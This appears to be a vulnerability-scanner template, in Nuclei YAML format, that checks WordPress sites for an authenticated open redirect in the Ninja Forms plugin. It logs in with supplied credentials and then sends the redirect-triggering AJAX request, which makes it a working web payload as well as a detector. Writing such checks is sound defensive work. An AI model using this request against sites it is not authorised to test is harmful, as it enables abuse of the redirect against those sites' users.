id: ninjaform-open-redirect
info:
  author: dhiyaneshDk
  description: The wp_ajax_nf_oauth_connect AJAX action was vulnerable to open redirect
    due to the use of a user supplied redirect parameter and no protection in place.
  name: Ninja Forms < 3.4.34 - Administrator Open Redirect
  reference: https://wpscan.com/vulnerability/6147acf5-e43f-47e6-ab56-c9c8be584818
  severity: medium
  tags: wordpress,redirect,wp-plugin,ninjaform,authenticated
requests:
- cookie-reuse: true
  matchers:
  - part: header
    regex:
    - (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)google\.com\/?(\/|[^.].*)?$
    type: regex
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin-ajax.php?client_id=1&redirect=https://google.com&action=nf_oauth_connect
    HTTP/1.1

    Host: {{Hostname}}

    '
